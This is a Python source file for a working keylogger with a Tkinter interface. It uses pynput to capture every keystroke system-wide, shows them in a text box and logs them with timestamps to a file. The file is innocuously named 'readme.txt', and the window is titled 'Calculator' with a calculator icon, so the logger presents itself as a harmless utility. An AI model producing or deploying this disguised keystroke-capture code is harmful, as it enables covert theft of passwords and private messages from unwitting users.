import pynput
from pynput.keyboard import Key, Listener
import logging
import tkinter as tk
from tkinter import scrolledtext, filedialog
from tkinter import *
import threading
import time

class KeyloggerUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Calculator")
        self.root.resizable(False, False)
        # Adding image icon
        photo = PhotoImage(file="calculator_icon.png")
        root.iconphoto(False, photo)


        # Dark theme colors
        bg_color = "#1E1E1E"  # Background color
        fg_color = "#FFFFFF"  # Foreground color
        hover_color = "#313131"  # Hover color

        self.root.configure(bg=bg_color)

        self.log_dir = filedialog.askdirectory(title="Select Log Directory")
        self.log_file = self.log_dir + "/readme.txt"
        logging.basicConfig(filename=self.log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=40, height=10, bg=bg_color, fg=fg_color,cursor='hand2')
        self.text_area.pack(padx=10, pady=10)

        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger, bg=bg_color, fg=fg_color,cursor='hand2')
        self.start_button.pack(pady=10)
        self.add_hover_effect(self.start_button, hover_color,bg_color)

        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger, bg=bg_color, fg=fg_color,cursor='hand2')
        self.stop_button.pack(pady=10)
        self.add_hover_effect(self.stop_button, hover_color,bg_color)

        self.auto_save_button = tk.Button(root, text="Enable Auto Save", command=self.enable_auto_save, bg=bg_color, fg=fg_color,cursor='hand2')
        self.auto_save_button.pack(pady=10)
        self.add_hover_effect(self.auto_save_button, hover_color,bg_color)

        self.auto_save = False
        self.auto_save_interval = 60  # seconds

    def on_press(self, key):
        logging.info(str(key))
        self.text_area.insert(tk.END, str(key) + "\n")
        self.text_area.yview(tk.END)

    def start_keylogger(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()

    def stop_keylogger(self):
        if hasattr(self, 'listener') and self.listener is not None:
            self.listener.stop()
            self.listener.join()

    def enable_auto_save(self):
        if not self.auto_save:
            self.auto_save = True
            self.auto_save_thread = threading.Thread(target=self.auto_save_loop)
            self.auto_save_thread.start()

    def auto_save_loop(self):
        while self.auto_save:
            time.sleep(self.auto_save_interval)
            self.save_to_file()

    def save_to_file(self):
        text_content = self.text_area.get(1.0, tk.END)
        with open(self.log_file, 'w') as file:
            file.write(text_content)

    def add_hover_effect(self, button, hover_color, bg_color):
        button.bind("<Enter>", lambda event: self.on_hover_enter(event, button, hover_color))
        button.bind("<Leave>", lambda event: self.on_hover_leave(event, button, bg_color))

    def on_hover_enter(self, event, button, hover_color):
        button.configure(bg=hover_color)

    def on_hover_leave(self, event, button, bg_color):
        button.configure(bg=bg_color)  # Reset to the default background color

if __name__ == "__main__":
    root = tk.Tk()
    keylogger_ui = KeyloggerUI(root)
    root.mainloop()